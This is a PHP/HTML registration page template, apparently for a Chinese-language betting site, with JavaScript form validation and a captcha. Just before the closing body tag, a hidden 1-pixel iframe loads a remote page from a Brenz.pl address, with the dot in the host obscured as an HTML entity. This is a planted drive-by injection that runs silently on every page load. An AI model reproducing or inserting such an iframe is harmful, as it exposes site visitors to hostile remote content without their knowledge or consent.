<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php $this->display('inc_skin_lr.php',0,'新用户注册'); ?>
<script type="text/javascript" src="/wjinc/default/js/jquery.banner.js"></script>
</head>
<body style="background: url(/img/page_bg.png);">
<script type="text/javascript">
   function registerBefor(){
	var type=$('[name=type]:checked',this).val();
	if(!this.vcode.value){ 
	  davidError('请输入图片中的验证码');
	  return false;
	}else if(!this.username.value){ 
	  davidError('请输入用户名');
	}else if(!/^\w{4,16}$/.test(this.username.value)){
	  davidError('用户名由4到16位的字母、数字及下划线组成');
	}else if(!this.password.value){
	  davidError('请输入密码');
	  }else if(!this.qq.value){
	  davidError('请输入QQ');
	  
	  }else if(!/^\d{5,11}$/.test(this.qq.value)){
	  davidError('腾讯QQ由5到11位的纯数字');
	 }else if(this.password.value.length<6){
	  davidError('密码至少6位');
	}else if(!this.cpasswd.value){
	  davidError('请输入确认密码');
	}else if(this.cpasswd.value!=this.password.value){
	  davidError('两次输入密码不一样');
	}else{
	   return true;
	}
	return false;
}
function register(err,data){
	if(err){
		davidInfo(err);
		$('input[name=vcode]')
		.val('');
		$('#validate').click();
	}else{
		davidOk(data);
		location='/index.php?tnt=uln';
	}
}
</script>
       <?php if($args[0]){?>
       <div class="regis_bg">
       <div class="cnt">
       <div class="regis_top">
                <h1 class="fl">
                    <a href="/">
                        <img src="/img/logo3.png"></a></h1>
                <p class="fr regis_language">
                    <a href="javascript:void(0)">English</a>|<a href="javascript:void(0)" class="current">简体中文</a>
                </p>
            </div>
            <div class="regis_nr">
            <div class="regis_left fl">
            <div class="regis_title">
                        <i class="signicon blockicon"></i>
                        <h2 class="fl">
                            快速注册</h2>
                        <span class="fr">Quick Register</span>
                    </div>
		<form action="<?=$this->basePath('User-reg') ?>" method="post" onajax="registerBefor" enter="true" call="register" target="ajax">
        	<input type="hidden" name="codec" value="<?=$args[0]?>" />
    <div id="xf_login_mid" style="padding: 23px 0px 23px 23px;overflow: hidden;font-family:'宋体';">
                    <div class="regis_block">
                    <span class="regis_name fl">用户名</span>
                        <input class="chang reg_user_input" name="username" type="text" id="username" value="" spellcheck="false" maxlength="5096" title="由0-9,a-z,A-Z组成的6-16个字符" placeholder="" autocomplete="off">
                    </div>
                    <div class="reg_login_form_user" style="display: none;">
                       <input class="chang reg_user_input" aria-label="昵称：" type="text" name="nickname" id="nickname" value="" spellcheck="false" maxlength="5096" title="由2至8个字符组成" placeholder="昵称" autocomplete="off">
                    </div>
                    <div class="regis_block">
                    <span class="regis_name fl">密码</span>
                        <input class="chang reg_password_input" name="password" type="password" id="password" spellcheck="false" maxlength="50" placeholder="" autocomplete="off">
                    </div>
					<div class="regis_block">
                    <span class="regis_name fl">确认密码</span>
                        <input class="chang reg_password_input" name="cpasswd" type="password" id="cpasswd" spellcheck="false" maxlength="50" placeholder="" autocomplete="off">
                    </div>
                  
					<div class="regis_block">
                    <span class="regis_name fl">腾讯QQ</span>
                        <input class="chang reg_password_input" name="qq" type="text" id="qq" spellcheck="false" maxlength="50" placeholder="用于找回密码" autocomplete="off">
                    </div>
					
					
                    <div class="regis_block">
                    <span class="regis_name fl">效验码</span>
                        <input class="duan reg_veri_input"  aria-label="验证码：" type="text" name="vcode"  id="vcode" value="" spellcheck="false" maxlength="5096" title="请输入右边图片中的数字"  placeholder="" autocomplete="off" style="width: 146px">

                    <div class="vcode fr">
                         <img width="80" id="validate" height="32" border="0" style="cursor:pointer;" align="absmiddle" src="<?=$this->basePath('User-vcode')."&t=".$this->time ?>" title="看不清楚，换一张图片" onclick="this.src='<?=$this->basePath('User-vcode') ?>'+(new Date()).getTime()"/>
                  
                            </p>
                        </div>
                    </div>
                    <div class="xf_login_butt"  style="margin-top: 0">
                        <input type="submit" value="注册"  class="login_c">
                    </div>
                </div>
            </div>
                    <div class="regis_banner fl">
                    <div class="banner">
  <ul class="banList">
    <li class="active">
	<img src="/img/reg/r1.png"/></li>
    <!--li><img src="/img/reg/r2.png"/></li>
    <li><img src="/img/reg/r3.png"/></li>
  </ul-->
  <div class="fomW">
    <div class="jsNav" style="z-index:50;">
      <!--a href="javascript:void(0);" class="trigger current"></a>
      <a href="javascript:void(0);" class="trigger" ></a>
      <a href="javascript:void(0);" class="trigger"></a-->
    </div>
  </div>
</div>
<script type="text/javascript"> 
$(function(){
  $(".banner").swBanner();
});
</script>
                    </div>
        </div><div class="regis_way">
                <div class="regis_one fl">
                    <img src="/img/name.png"></div>
                <div class="regis_one fl regis_two">
                    <span class="regis_img fl">
                        <img src="/img/pic1.png"></span>
                    <div class="regis_font fl">
                        <h3>
                            网页版地址</h3>
                        <p>
                            <a href="/index.php" id="WebUrl">点击进入→</a></p>                        
                    </div>
                </div>
                <div class="regis_one fl regis_three">
                    <span class="regis_img fl">
                        <img src="/img/pic2.png"></span>
                    <div class="regis_font fl">
                        <h3>
                            客户端暂停下载</h3>
                        <p>
                            <span>1</span>安装<a href="http://go.microsoft.com/fwlink/?LinkID=149156&amp;v=4.0.50826.0" target="_blank">微软Microsoft Sliverlight</a>插件</p>
                        <p>
                            <span>2</span>访问<a href="http://www.996bet.com" id="WWWUrl"></a></p>
                    </div>
                </div>
    </div>

</form>
<?php }else{?>
   <div style="text-align:center; line-height:50px; color:#FF0; font-size:20px; font-weight:bold;">链接已失效</div>
<?php }?>

</div>
</div>
</div>
<?php $this->display('inc_footer.php') ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
